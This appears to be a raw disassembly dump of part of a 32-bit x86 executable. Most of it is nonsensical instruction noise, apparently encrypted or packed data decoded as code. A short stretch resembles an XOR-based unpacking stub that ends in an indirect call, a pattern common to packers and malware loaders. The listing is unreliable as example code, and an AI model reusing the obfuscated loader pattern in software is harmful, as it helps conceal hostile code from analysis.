  40db89:	inc    edi
  40db8a:	pop    ecx
  40db8b:	mov    eax,ds:0x8064278f
  40db90:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40db91:	sub    esi,DWORD PTR [eax+0x58c4b56f]
  40db97:	add    edx,DWORD PTR [ebp+eiz*4-0x7a3aae57]
  40db9e:	xchg   edi,eax
  40db9f:	rcl    BYTE PTR [ebx+ebp*4],0x91
  40dba3:	iret   
  40dba4:	and    ebx,edi
  40dba6:	push   esi
  40dba7:	clc    
  40dba8:	dec    esp
  40dba9:	daa    
  40dbaa:	dec    esi
  40dbab:	mov    eax,0xe1e38806
  40dbb0:	mov    edi,0xcb86a393
  40dbb5:	sub    eax,0x8f01895a
  40dbba:	push   es
  40dbbb:	cmp    eax,0xf7a5f697
  40dbc0:	push   ebp
  40dbc1:	push   0x5953b4a0
  40dbc6:	retf   
  40dbc7:	sub    ebp,esi
  40dbc9:	sub    al,0xff
  40dbcb:	lahf   
  40dbcc:	mov    cl,0xff
  40dbce:	push   ecx
  40dbcf:	sub    BYTE PTR [edx+0x4],cl
  40dbd2:	lahf   
  40dbd3:	dec    esp
  40dbd4:	sbb    DWORD PTR [ebx+0x38e25701],edi
  40dbda:	jae    0x40dc4d
  40dbdc:	jmp    0x40dc34
  40dbde:	dec    edx
  40dbdf:	add    eax,0xc944de38
  40dbe4:	scas   al,BYTE PTR es:[edi]
  40dbe5:	mov    DWORD PTR [eax-0x7f],esi
  40dbe8:	fist   DWORD PTR [edi+0x58]
  40dbeb:	ret    0x723a
  40dbee:	gs sti 
  40dbf0:	jne    0x40dbb4
  40dbf2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dbf3:	push   ss
  40dbf4:	mov    ch,BYTE PTR [edx+0x1fc4b354]
  40dbfa:	neg    DWORD PTR [ebp+0x5c]
  40dbfd:	xchg   ebp,eax
  40dbfe:	or     BYTE PTR [esi],ah
  40dc00:	jp     0x40dbea
  40dc02:	jne    0x87f701f2
  40dc08:	and    bl,bl
  40dc0a:	clc    
  40dc0b:	cli    
  40dc0c:	jbe    0x40dc55
  40dc0e:	sub    edi,DWORD PTR [ecx+0x1a]
  40dc11:	(bad)  
  40dc14:	jo     0x40dbf8
  40dc16:	mov    ds:0x870fd6ec,al
  40dc1b:	lds    esi,FWORD PTR [edx]
  40dc1d:	adc    eax,0x48a9762c
  40dc22:	push   0xb8b517a5
  40dc27:	mov    ds:0x43f3f3a2,eax
  40dc2c:	test   eax,0x8118b740
  40dc31:	dec    ecx
  40dc32:	inc    esi
  40dc33:	jp     0x40dc40
  40dc35:	mov    ebx,esp
  40dc37:	xor    BYTE PTR [esi+ebx*4],ah
  40dc3a:	jle    0x40dc69
  40dc3c:	pop    ecx
  40dc3d:	dec    eax
  40dc3e:	scas   eax,DWORD PTR es:[edi]
  40dc3f:	inc    esp
  40dc40:	lahf   
  40dc41:	lods   eax,DWORD PTR ds:[esi]
  40dc42:	sahf   
  40dc43:	lea    esp,[ebx]
  40dc45:	fsubr  QWORD PTR [ebp+esi*2-0x17]
  40dc49:	enter  0x83e,0x82
  40dc4d:	cwde   
  40dc4e:	fadd   DWORD PTR [ebx+edx*8-0x31c56cb1]
  40dc55:	push   edi
  40dc56:	add    al,0xa6
  40dc58:	pop    edi
  40dc59:	out    0x4,eax
  40dc5b:	aaa    
  40dc5c:	ficom  DWORD PTR [ecx-0x70]
  40dc5f:	ja     0x40dc14
  40dc61:	push   esp
  40dc62:	push   es
  40dc63:	daa    
  40dc64:	mov    edx,DWORD PTR [ebp+0x8]
  40dc67:	mov    edi,DWORD PTR [ebp-0x24]
  40dc6a:	jmp    0x40df8a
  40dc6f:	repnz cmp al,0x15
  40dc72:	adc    al,0x31
  40dc74:	aad    0xf3
  40dc76:	fcom   DWORD PTR [eax*8-0x60e53768]
  40dc7d:	bound  ebp,QWORD PTR [esi]
  40dc7f:	xor    eax,0x7d7e7e9a
  40dc84:	jge    0x40dd04
  40dc86:	jle    0x40dc81
  40dc88:	add    ebp,edi
  40dc8a:	add    cl,ch
  40dc8c:	and    eax,0xc02e3bfb
  40dc91:	call   0x63f24607
  40dc96:	test   edx,eax
  40dc98:	mov    edx,0xacb02840
  40dc9d:	icebp  
  40dc9e:	inc    edx
  40dc9f:	ror    DWORD PTR [edi],cl
  40dca1:	push   ss
  40dca2:	xor    BYTE PTR [ecx],cl
  40dca4:	xor    BYTE PTR [esp+eax*4+0x4d853c2d],bl
  40dcab:	push   eax
  40dcac:	mov    esi,0x3adea45d
  40dcb1:	scas   al,BYTE PTR es:[edi]
  40dcb2:	fdivr  QWORD PTR [ebx]
  40dcb4:	and    ah,BYTE PTR [ebp-0x64251c1d]
  40dcba:	ret    
  40dcbb:	sub    al,BYTE PTR [edx]
  40dcbd:	out    dx,eax
  40dcbe:	lea    ebx,[edx]
  40dcc0:	cli    
  40dcc1:	add    al,ah
  40dcc3:	mov    ch,0x98
  40dcc5:	(bad)  
  40dcc6:	adc    al,0xdd
  40dcc8:	push   ecx
  40dcc9:	xor    edx,ebx
  40dccb:	daa    
  40dccc:	test   DWORD PTR [esi+0x52],0x29a0e447
  40dcd3:	fcomip st,st(2)
  40dcd5:	stc    
  40dcd6:	dec    eax
  40dcd7:	pop    es
  40dcd8:	inc    eax
  40dcd9:	lds    edx,FWORD PTR [esi-0x2f]
  40dcdc:	test   DWORD PTR es:[ecx-0x53],esp
  40dce0:	pop    DWORD PTR [edx+0x49b7dc45]
  40dce6:	add    al,bh
  40dce8:	out    0x2d,al
  40dcea:	dec    edi
  40dceb:	sbb    ch,BYTE PTR [ebx+0x1c]
  40dcee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dcef:	pmaxsw mm7,QWORD PTR [ecx]
  40dcf2:	shl    ecx,cl
  40dcf4:	push   cs
  40dcf5:	pop    esp
  40dcf6:	jecxz  0x40dd3b
  40dcf8:	or     al,0x7
  40dcfa:	call   0x5719cdeb
  40dcff:	jnp    0x40dca1
  40dd01:	adc    edx,DWORD PTR [eax]
  40dd03:	xchg   esi,eax
  40dd04:	fmul   DWORD PTR [eax]
  40dd06:	mov    esp,0xb6667236
  40dd0b:	xchg   edi,eax
  40dd0c:	sbb    eax,0x51e394e1
  40dd11:	xchg   ebp,eax
  40dd12:	icebp  
  40dd13:	pop    eax
  40dd14:	(bad)  [eax]
  40dd16:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dd17:	pusha  
  40dd18:	mov    edx,0x24b43b26
  40dd1d:	xchg   BYTE PTR [esi-0x55],ah
  40dd20:	xchg   BYTE PTR [ebx-0x39],dl
  40dd23:	inc    ebp
  40dd24:	jle    0x40dd65
  40dd26:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dd27:	sub    DWORD PTR [esi-0x32],ebp
  40dd2a:	jbe    0x40dd43
  40dd2c:	dec    edx
  40dd2d:	xor    eax,0x8a6d1b90
  40dd32:	add    DWORD PTR [ebp-0x5b],ecx
  40dd35:	test   ebp,0xe44a5e48
  40dd3b:	mov    dl,0x5a
  40dd3d:	sbb    BYTE PTR [eax-0x78c2414b],0xda
  40dd44:	inc    esi
  40dd45:	push   es
  40dd46:	mov    esi,0xdded50ec
  40dd4b:	push   edi
  40dd4c:	xchg   BYTE PTR [ebp+0xf7c2f75],al
  40dd52:	ss mov cl,0x13
  40dd55:	icebp  
  40dd56:	jecxz  0x40dd33
  40dd58:	jne    0x40dd46
  40dd5a:	xchg   ebx,eax
  40dd5b:	mov    cl,0x8
  40dd5d:	inc    edx
  40dd5e:	popf   
  40dd5f:	xchg   ebx,eax
  40dd60:	pop    es
  40dd61:	ja     0x40dd9c
  40dd63:	sub    BYTE PTR [edi+0x4e3944c3],ah
  40dd69:	cmp    esi,DWORD PTR [edx]
  40dd6b:	call   0xed632e10
  40dd70:	jbe    0x40dcfc
  40dd72:	lds    ebx,FWORD PTR [esi+0x56]
  40dd75:	xchg   edi,eax
  40dd76:	repz aas 
  40dd78:	mov    ds:0x3a5ad9cb,al
  40dd7d:	cmc    
  40dd7e:	xchg   edx,edi
  40dd80:	dec    ebp
  40dd81:	sub    BYTE PTR [edi-0x22],ah
  40dd84:	std    
  40dd85:	shr    DWORD PTR [edx],0xbc
  40dd88:	dec    edx
  40dd89:	and    BYTE PTR [edx+0x12],al
  40dd8c:	mov    ebx,0xee2238b2
  40dd91:	lods   al,BYTE PTR ds:[esi]
  40dd92:	adc    ah,BYTE PTR [esi]
  40dd94:	daa    
  40dd95:	jmp    0x40dd6e
  40dd97:	sbb    DWORD PTR ds:0xbf899e0a,ecx
  40dd9d:	gs pop es
  40dd9f:	cwde   
  40dda0:	xchg   ecx,eax
  40dda1:	jo     0x40dde8
  40dda3:	xchg   ecx,eax
  40dda4:	cmp    DWORD PTR [esp+ebx*8],esp
  40dda7:	add    eax,0xebcdc235
  40ddac:	pop    esi
  40ddad:	cmp    al,0xba
  40ddaf:	xor    al,0xcc
  40ddb1:	push   0x95c14dfa
  40ddb6:	aam    0xd3
  40ddb8:	mov    cl,0xef
  40ddba:	lds    ebp,FWORD PTR [edi]
  40ddbc:	clc    
  40ddbd:	mov    BYTE PTR [ecx+0x3c3fc465],0x3e
  40ddc4:	pushf  
  40ddc5:	adc    al,0x2b
  40ddc7:	xchg   ebp,eax
  40ddc8:	ffreep st(7)
  40ddca:	push   ds
  40ddcb:	popa   
  40ddcc:	not    BYTE PTR ds:[esi+eiz*1]
  40ddd0:	add    DWORD PTR [edx-0x70],ecx
  40ddd3:	sub    esp,eax
  40ddd5:	test   DWORD PTR [edi],ebx
  40ddd7:	or     BYTE PTR [ecx-0x49a78fa7],0x94
  40ddde:	scas   al,BYTE PTR es:[edi]
  40dddf:	std    
  40dde0:	sub    BYTE PTR [eax-0x70],al
  40dde3:	push   0xf90782cd
  40dde8:	sub    DWORD PTR [ecx-0x73279218],esp
  40ddee:	pushf  
  40ddef:	int    0xb
  40ddf1:	stc    
  40ddf2:	and    eax,0x706dab2a
  40ddf7:	sbb    eax,0x978f54d1
  40ddfc:	mov    al,cl
  40ddfe:	test   al,0xa5
  40de00:	test   DWORD PTR [ebp+0x45945852],ebp
  40de06:	inc    ebp
  40de07:	or     DWORD PTR [ecx],ebp
  40de09:	inc    edx
  40de0a:	fwait
  40de0b:	sub    esi,DWORD PTR [ecx+edx*4-0x6de8e670]
  40de12:	in     eax,0x66
  40de14:	(bad)  
  40de16:	shr    DWORD PTR [esi-0x44a6b402],cl
  40de1c:	dec    ebp
  40de1d:	dec    eax
  40de1e:	and    bl,BYTE PTR [eax]
  40de20:	sbb    eax,0x549882e7
  40de25:	(bad)  
  40de26:	popf   
  40de27:	fild   DWORD PTR [eax]
  40de29:	mov    esp,0x89b0eff2
  40de2e:	sar    BYTE PTR [ecx+0x55],1
  40de31:	sar    ebp,cl
  40de33:	mov    BYTE PTR [ebp-0x33],bl
  40de36:	into   
  40de37:	dec    esp
  40de38:	cmc    
  40de39:	mov    edi,0xea964ecc
  40de3e:	inc    ebp
  40de3f:	or     BYTE PTR [esi+0x3989eb79],dl
  40de45:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40de46:	pop    ebx
  40de47:	retf   
  40de48:	call   0x45b9:0x4f76daf5
  40de4f:	iret   
  40de50:	mov    BYTE PTR [eax-0x1b],ch
  40de53:	jmp    0x20d9:0x54edfe4e
  40de5a:	nop
  40de5b:	stos   BYTE PTR es:[edi],al
  40de5c:	xor    esp,DWORD PTR [eax-0x38]
  40de5f:	and    al,BYTE PTR [ecx]
  40de61:	test   eax,0x555422a1
  40de66:	ja     0x40deb1
  40de68:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40de69:	or     dl,ah
  40de6b:	repz jmp 0x75ba:0x98e6dcdf
  40de73:	cmp    eax,0xf8ac5d7f
  40de78:	add    edx,DWORD PTR [esi-0x205c62d7]
  40de7e:	sahf   
  40de7f:	pop    ss
  40de80:	repnz cmp DWORD PTR [eax],esi
  40de83:	dec    edi
  40de84:	rcr    cl,0xef
  40de87:	add    al,0x77
  40de89:	sbb    ch,BYTE PTR ds:[esp+ecx*8]
  40de8d:	fcom   QWORD PTR [edi+0x54]
  40de90:	aad    0x9e
  40de92:	leave  
  40de93:	retf   0x8181
  40de96:	xchg   edx,eax
  40de97:	add    edi,edx
  40de99:	xor    edx,DWORD PTR [eax]
  40de9b:	push   esi
  40de9c:	cmp    al,BYTE PTR [ebx-0x36900f99]
  40dea2:	(bad)
  40dea5:	push   esi
  40dea6:	mov    edi,0x4b456635
  40deab:	fsubr  QWORD PTR [edx-0xe]
  40deae:	shl    ebp,1
  40deb0:	fistp  WORD PTR [ebx+0x1c]
  40deb3:	dec    ebx
  40deb4:	iret   
  40deb5:	push   ecx
  40deb6:	xor    DWORD PTR [edx+0x6fcfb358],0x8a2a354b
  40dec0:	mov    WORD PTR [esi+0x4d321202],gs
  40dec6:	imul   ecx,DWORD PTR [ecx+0x230efd21],0x9e4f6a80
  40ded0:	aad    0xb4
  40ded2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ded3:	pusha  
  40ded4:	mov    ecx,0xdbc13cd
  40ded9:	cmove  ebp,ecx
  40dedc:	inc    esi
  40dedd:	and    ah,cl
  40dedf:	add    DWORD PTR [ebx-0x78],esp
  40dee2:	idiv   DWORD PTR [eax]
  40dee4:	mov    esp,0x2c4312c4
  40dee9:	pop    edx
  40deea:	push   ecx
  40deeb:	js     0x40df36
  40deed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40deee:	mov    eax,ds:0xd0828853
  40def3:	sub    BYTE PTR [esp+eax*8],dh
  40def6:	retf   0xa532
  40def9:	or     BYTE PTR [edi+0x4f734cc0],ah
  40deff:	push   ds
  40df00:	xor    DWORD PTR [ebx],esp
  40df02:	xchg   esi,eax
  40df03:	retf   
  40df04:	jecxz  0x40deb8
  40df06:	loope  0x40def1
  40df08:	in     eax,0xac
  40df0a:	jns    0x40df22
  40df0c:	add    bl,dh
  40df0e:	xchg   esp,eax
  40df0f:	es mov al,0x52
  40df12:	fimul  DWORD PTR [ebx]
  40df14:	and    bh,dl
  40df16:	loope  0x40df88
  40df18:	shl    dl,0x62
  40df1b:	cmp    al,0x96
  40df1d:	adc    ch,al
  40df1f:	pop    edi
  40df20:	jmp    0x50475eaa
  40df25:	mov    ecx,0xef0efacc
  40df2a:	mov    bl,bl
  40df2c:	mov    ch,0xb4
  40df2e:	sbb    DWORD PTR [ecx-0x63008add],esp
  40df34:	aas    
  40df35:	(bad)  
  40df36:	lds    ebp,FWORD PTR [ebx+0x15586a31]
  40df3c:	fdivr  QWORD PTR ds:0x7be904eb
  40df42:	add    al,al
  40df44:	mov    al,0xdd
  40df46:	or     ebx,edi
  40df48:	aad    0x7
  40df4a:	div    BYTE PTR cs:[eax-0x3493c468]
  40df51:	in     eax,dx
  40df52:	inc    edx
  40df53:	pop    gs
  40df55:	(bad)  
  40df56:	mov    al,ds:0x885656d3
  40df5b:	mov    WORD PTR [ecx],?
  40df5d:	pop    es
  40df5e:	pop    ebx
  40df5f:	xchg   ebp,eax
  40df60:	and    al,0xf9
  40df62:	leave  
  40df63:	test   DWORD PTR [ecx],ebx
  40df65:	pop    ss
  40df66:	or     ebx,edx
  40df68:	push   0x8f43932b
  40df6d:	sbb    DWORD PTR [ebx+ecx*4],esp
  40df70:	in     eax,dx
  40df71:	xchg   edi,eax
  40df72:	pop    edi
  40df73:	shl    bh,0x31
  40df76:	or     DWORD PTR [ecx-0x39b9597d],ebx
  40df7c:	pop    ebp
  40df7d:	arpl   WORD PTR [ebx+ebp*4],ax
  40df80:	adc    ch,BYTE PTR [edi-0x4cf1d4ed]
  40df86:	and    cl,BYTE PTR ds:[edi-0x30]
  40df8a:	mov    DWORD PTR [edi+edx*4],eax
  40df8d:	mov    eax,DWORD PTR [ebp-0x18]
  40df90:	mov    edx,DWORD PTR [ebp+0x8]
  40df93:	xor    eax,ecx
  40df95:	lea    eax,[eax+edx*1+0x32729b]
  40df9c:	mov    DWORD PTR [ebp+0x8],eax
  40df9f:	mov    eax,DWORD PTR [ebp-0x18]
  40dfa2:	mov    edx,DWORD PTR [ebp+0x14]
  40dfa5:	xor    eax,ecx
  40dfa7:	add    eax,esi
  40dfa9:	imul   eax,DWORD PTR [edx]
  40dfac:	mov    edx,DWORD PTR [ebp-0x4]
  40dfaf:	xor    edx,ecx
  40dfb1:	mov    ecx,DWORD PTR [ebp+0x8]
  40dfb4:	lea    ecx,[edx+ecx*1+0x32729b]
  40dfbb:	cmp    ecx,eax
  40dfbd:	jne    0x40d5f9
  40dfc3:	mov    ebx,esi
  40dfc5:	jmp    0x40dfcf
  40dfca:	mov    ebx,0x32729b
  40dfcf:	mov    eax,DWORD PTR [ebp-0x4]
  40dfd2:	xor    eax,0x7510854
  40dfd7:	add    eax,ebx
  40dfd9:	mov    DWORD PTR [ebp-0xc],eax
  40dfdc:	xor    ebx,ebx
  40dfde:	lea    eax,[ebp-0x10]
  40dfe1:	add    ebx,DWORD PTR [eax]
  40dfe3:	call   ebx
  40dfe5:	xor    ebx,ebx
  40dfe7:	inc    ebx
  40dfe8:	cmp    DWORD PTR [ebp+0x10],ebx
  40dfeb:	je     0x40e009
  40dff1:	xchg   edx,eax
  40dff2:	push   0xa
  40dff4:	pop    ecx
  40dff5:	push   0x4
  40dff7:	pop    ebx
  40dff8:	inc    ebx
  40dff9:	xchg   ebx,ecx
  40dffb:	sub    ebx,ecx
  40dffd:	xchg   ebx,ecx
  40dfff:	dec    ecx
  40e000:	mov    eax,DWORD PTR [ebp-0x1c]
  40e003:	imul   eax,ecx
  40e006:	add    esp,eax
  40e008:	xchg   edx,eax
  40e009:	push   eax
  40e00a:	xor    ebx,ebx
  40e00c:	mov    edx,esp
  40e00e:	dec    edx
  40e00f:	inc    ebx
  40e010:	add    ebx,DWORD PTR [edx+ebx*1]
  40e013:	jmp    0x40e333
  40e018:	lods   al,BYTE PTR ds:[esi]
  40e019:	and    bl,bl
  40e01b:	xchg   esp,eax
  40e01c:	jno    0x40e073
  40e01e:	jno    0x40e042
  40e020:	add    cl,cl
  40e022:	movd   DWORD PTR cs:[edi-0x4e],mm3
  40e027:	push   DWORD PTR [eax]
  40e029:	cdq    
  40e02a:	jle    0x40e0aa
  40e02c:	jge    0x40e0ab
  40e02e:	jle    0x40e0ae
  40e030:	into   
  40e031:	fld    st(0)
  40e033:	jp     0x40e048
  40e035:	rol    bl,cl
  40e037:	or     BYTE PTR [ecx+0x6837a58],dh
  40e03d:	pop    edx
  40e03e:	cdq    
  40e03f:	ss mov cl,0x7a
  40e042:	sti    
  40e043:	clc    
  40e044:	and    eax,0x4e75cab2
  40e049:	ret    
  40e04a:	mov    ch,0x8a
  40e04c:	popf   
  40e04d:	mov    ebp,0x8a2f8f78
  40e052:	fiadd  WORD PTR [esp+eax*1+0x21117554]
  40e059:	test   BYTE PTR [bp+di-0x4c],bl
  40e05d:	jmp    edi
  40e05f:	ds sub al,0x4d
  40e062:	dec    ebp
  40e063:	sub    DWORD PTR gs:[edi+ebx*1],ecx
  40e067:	int    0xd
  40e069:	mov    esi,0xf9ea439b
  40e06e:	jnp    0x40e013
  40e070:	mov    ecx,cs
  40e072:	cs lahf 
  40e074:	sub    al,BYTE PTR [ebx+ebx*4-0x76868e49]
  40e07b:	cmp    dl,dl
  40e07d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e07e:	pop    esp
  40e07f:	mov    db5,eax
  40e082:	and    ah,0xe6
  40e085:	or     al,0x26
  40e087:	cmp    al,0x74
  40e089:	rol    DWORD PTR [eax],1
  40e08b:	ror    DWORD PTR [ebp+esi*4-0x6c8fa4c],cl
  40e092:	sbb    ch,ah
  40e094:	xchg   ebp,eax
  40e095:	jg     0x40e063
  40e097:	clc    
  40e098:	and    bh,0x80
  40e09b:	out    0x5f,eax
  40e09d:	sub    al,0xdb
  40e09f:	mov    ds:0x5336e5b0,eax
  40e0a4:	sbb    BYTE PTR [ecx-0x1f],bh
  40e0a7:	and    bh,al
  40e0a9:	jmp    0xd984:0x11e13c5a
  40e0b0:	push   esp
  40e0b1:	call   0x7abe5d6c
  40e0b6:	pop    ecx
  40e0b7:	je     0x40e136
  40e0b9:	scas   al,BYTE PTR es:[edi]
  40e0ba:	jo     0x40e0a4
  40e0bc:	nop
  40e0bd:	push   esp
  40e0be:	or     ebx,DWORD PTR [ebx-0x51]
  40e0c1:	push   eax
  40e0c2:	xchg   esp,eax
  40e0c3:	ss popa 
  40e0c5:	lods   eax,DWORD PTR ds:[esi]
  40e0c6:	mov    fs:0xc6ec5554,al
  40e0cc:	cmp    eax,0xc0b0b5cd
  40e0d1:	mov    eax,0x1d83050b
  40e0d6:	and    ah,ah
  40e0d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e0d9:	stc    
  40e0da:	mov    al,ds:0x8983205
  40e0df:	inc    ebp
  40e0e0:	(bad)  
  40e0e1:	outs   dx,DWORD PTR ds:[esi]
  40e0e2:	imul   ebp,DWORD PTR ds:0xbae8e0d9,0xb45d0678
  40e0ec:	ror    BYTE PTR [ebp+eax*8-0x29],0xfe
  40e0f1:	stos   DWORD PTR es:[edi],eax
  40e0f2:	push   cs
  40e0f3:	test   DWORD PTR [ebx+0x15],edi
  40e0f6:	adc    DWORD PTR [edi+0x12fca90e],0x21
  40e0fd:	mov    edi,DWORD PTR ds:0x724cc18d
  40e103:	push   ds
  40e104:	mov    edx,0x496a7fa0
  40e109:	inc    DWORD PTR [ecx-0x2626b025]
  40e10f:	inc    edi
  40e110:	test   DWORD PTR [ebp-0x1b],ecx
  40e113:	xor    dh,BYTE PTR cs:[edx+ebx*8-0x34343ec]
  40e11b:	sar    DWORD PTR [ecx],0xd2
  40e11e:	cmp    bh,BYTE PTR [ebp-0x27]
  40e121:	mov    dl,0x19
  40e123:	imul   eax,DWORD PTR [esi],0x48ba3fe9
  40e129:	mov    cl,0xa1
  40e12b:	cdq    
  40e12c:	ss mov ecx,0xd6764e91
  40e132:	xor    DWORD PTR [ebp-0x79030dc4],esp
  40e138:	je     0x40e1a2
  40e13a:	xor    BYTE PTR [ecx],ah
  40e13c:	jmp    0x3ec3:0x2df0ac18
  40e143:	into   
  40e144:	(bad)  
  40e146:	sub    al,0xff
  40e148:	ror    DWORD PTR [eax],cl
  40e14a:	into   
  40e14b:	cmp    eax,0x2528e0cf
  40e150:	icebp  
  40e151:	or     eax,0x3079a298
  40e156:	mov    al,ds:0xef6cc0fd
  40e15b:	lea    esi,[edi-0x300d9c19]
  40e161:	add    DWORD PTR [ebp+0x2f7fc044],0xfffffff0
  40e168:	ret    
  40e169:	or     bh,bl
  40e16b:	and    ebx,DWORD PTR [ebx+edi*8+0x1a]
  40e16f:	(bad)  
  40e170:	cmp    ah,BYTE PTR [ecx+0x3710eb38]
  40e176:	mov    ah,dl
  40e178:	outs   dx,BYTE PTR ds:[esi]
  40e179:	js     0x40e192
  40e17b:	push   esp
  40e17c:	mov    eax,ds:0x4343bd53
  40e181:	or     ecx,DWORD PTR [ebp-0x2c]
  40e184:	loope  0x40e1c6
  40e186:	stos   DWORD PTR es:[edi],eax
  40e187:	push   ebx
  40e188:	ss pop esi
  40e18a:	aad    0x67
  40e18c:	pop    ebx
  40e18d:	(bad)  
  40e18e:	hlt    
  40e18f:	sbb    al,0x16
  40e191:	xor    ecx,DWORD PTR [edi+0x34]
  40e194:	shl    DWORD PTR [ecx+ebx*2-0x13],0x15
  40e199:	(bad)  [eax]
  40e19b:	into   
  40e19c:	test   dl,dh
  40e19e:	sub    edx,eax
  40e1a0:	scas   eax,DWORD PTR es:[edi]
  40e1a1:	jmp    0x40e20f
  40e1a3:	mov    dh,0x63
  40e1a5:	(bad)
  40e1a9:	loopne 0x40e175
  40e1ab:	shr    DWORD PTR [edi-0x6],1
  40e1ae:	mov    ebx,0x1acfc9d6
  40e1b3:	push   es
  40e1b4:	or     eax,0xd2f39cd6
  40e1b9:	sti    
  40e1ba:	(bad)  
  40e1bb:	inc    ebx
  40e1bc:	sbb    dl,cl
  40e1be:	iret   
  40e1bf:	dec    esp
  40e1c0:	and    dh,BYTE PTR [ecx+0x3c15a340]
  40e1c6:	hlt    
  40e1c7:	sbb    ah,BYTE PTR [edx]
  40e1c9:	dec    ecx
  40e1ca:	add    cl,BYTE PTR [eax]
  40e1cc:	test   BYTE PTR [edi-0x18],bh
  40e1cf:	adc    ecx,DWORD PTR [esi]
  40e1d1:	pop    ds
  40e1d2:	or     eax,0x890e3540
  40e1d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e1d8:	fdiv   QWORD PTR [ebp-0x4c7a3bcc]
  40e1de:	pop    es
  40e1df:	ins    BYTE PTR es:[edi],dx
  40e1e0:	ror    BYTE PTR [eax+0x68],0xf2
  40e1e4:	out    0xcf,al
  40e1e6:	je     0x40e1d8
  40e1e8:	lods   al,BYTE PTR ds:[esi]
  40e1e9:	pop    edx
  40e1ea:	(bad)  
  40e1ec:	jmp    0x4eb9:0x49c3be72
  40e1f3:	mov    ah,0x42
  40e1f5:	mov    ds:0x2691f62b,eax
  40e1fa:	shl    BYTE PTR gs:[ecx-0x7d6a2293],cl
  40e201:	psllw  mm1,mm2
  40e204:	ret    0xe29e
  40e207:	inc    edx
  40e208:	in     al,dx
  40e209:	xchg   BYTE PTR [ebx],dl
  40e20b:	and    eax,0x4ef64f78
  40e210:	aad    0x54
  40e212:	sti    
  40e213:	out    dx,al
  40e214:	mov    eax,0x3a2ad784
  40e219:	mov    esi,0xd814ea8d
  40e21e:	and    eax,0xbd80d4ba
  40e223:	data16 out dx,al
  40e225:	fild   QWORD PTR [esp+ebp*2]
  40e228:	test   al,0x88
  40e22a:	add    eax,0x1d94c3bc
  40e22f:	call   0xa8835668
  40e234:	jecxz  0x40e233
  40e236:	mov    bl,0x73
  40e238:	jno    0x40e2ac
  40e23a:	pop    ecx
  40e23b:	inc    edi
  40e23c:	inc    ebp
  40e23d:	out    0x8b,al
  40e23f:	mov    al,0x68
  40e241:	shr    al,0x71
  40e244:	push   ds
  40e245:	cmp    cl,BYTE PTR [ecx-0x3e79feeb]
  40e24b:	aas    
  40e24c:	mov    DWORD PTR [ecx],ecx
  40e24e:	out    0xfb,al
  40e250:	cdq    
  40e251:	pushf  
  40e252:	dec    edi
  40e253:	loopne 0x40e296
  40e255:	xchg   edx,eax
  40e256:	push   ss
  40e257:	int3   
  40e258:	stc    
  40e259:	outs   dx,BYTE PTR ds:[esi]
  40e25a:	test   cl,dl
  40e25c:	xor    eax,0x5c6ef2cb
  40e261:	add    esi,DWORD PTR [edx+0x273243c]
  40e267:	push   ss
  40e268:	popf   
  40e269:	ja     0x40e20b
  40e26b:	push   es
  40e26c:	icebp  
  40e26d:	shl    esp,1
  40e26f:	dec    edx
  40e270:	mov    ebx,0x527d8e91
  40e275:	push   ebx
  40e276:	mov    ebx,0x8109f635
  40e27b:	aas    
  40e27c:	pusha  
  40e27d:	sub    edx,DWORD PTR [esi-0x729729c3]
  40e283:	stos   BYTE PTR es:[edi],al
  40e284:	cmp    eax,0x26205ff4
  40e289:	xor    eax,0x319479e8
  40e28e:	std    
  40e28f:	pop    edi
  40e290:	test   BYTE PTR [eax-0x1f],dh
  40e293:	mov    WORD PTR [eax-0x2e],cs
  40e296:	sbb    eax,0x3790bc2d
  40e29b:	sbb    al,BYTE PTR [eax+ebx*4]
  40e29e:	bound  ebp,QWORD PTR [eax+0x4a413b10]
  40e2a4:	xor    BYTE PTR [ebp-0x20],al
  40e2a7:	test   DWORD PTR [ebx+0x51],esi
  40e2aa:	iret   
  40e2ab:	loope  0x40e2a2
  40e2ad:	inc    edx
  40e2ae:	cdq    
  40e2af:	lahf   
  40e2b0:	les    eax,FWORD PTR ds:0x89240ed5
  40e2b6:	data16 or al,0xa0
  40e2b9:	mov    eax,ds:0xdc89cd2
  40e2be:	mov    BYTE PTR [esp+edi*4+0x5f],0x53
  40e2c3:	je     0x40e27c
  40e2c5:	xlat   BYTE PTR ds:[ebx]
  40e2c6:	jns    0x40e26e
  40e2c8:	pop    es
  40e2c9:	sahf   
  40e2ca:	arpl   bp,bx
  40e2cc:	push   es
  40e2cd:	mov    eax,0xe161a09b
  40e2d2:	in     al,dx
  40e2d3:	mov    cl,BYTE PTR [edi+0x3b]
  40e2d6:	das    
  40e2d7:	cmp    al,0xa8
  40e2d9:	push   edx
  40e2da:	ret    
  40e2db:	stc    
  40e2dc:	ror    DWORD PTR [ecx],0x93
  40e2df:	add    eax,0x41eddf44
  40e2e4:	xor    al,0x92
  40e2e6:	test   eax,0xee63052e
  40e2eb:	hlt    
  40e2ec:	daa    
  40e2ed:	jp     0x40e301
  40e2ef:	sbb    eax,0x8b7689ee
  40e2f4:	inc    DWORD PTR [eax-0x319594f5]
  40e2fa:	les    esp,FWORD PTR [eax-0x3909d309]
  40e300:	aas    
  40e301:	sahf   
  40e302:	out    dx,eax
  40e303:	dec    ecx
  40e304:	xchg   edi,eax
  40e305:	aaa    
  40e306:	fdivp  st(5),st
  40e308:	mov    ds:0x60fd06d3,eax
  40e30d:	das    
  40e30e:	das    
  40e30f:	lahf   
  40e310:	cmp    dl,bl
  40e312:	xchg   ebx,eax
  40e313:	fsubr  QWORD PTR [ebx+0x3d3118b0]
  40e319:	inc    ecx
  40e31a:	and    eax,0xe2ad8740
  40e31f:	sbb    al,0x88
  40e321:	lock cmp al,0xd2
  40e324:	data16 das 
  40e326:	fld    TBYTE PTR [ebx+esi*4]
  40e329:	mov    BYTE PTR [edx+0x5652a66d],dh
  40e32f:	xlat   BYTE PTR ds:[ebx]
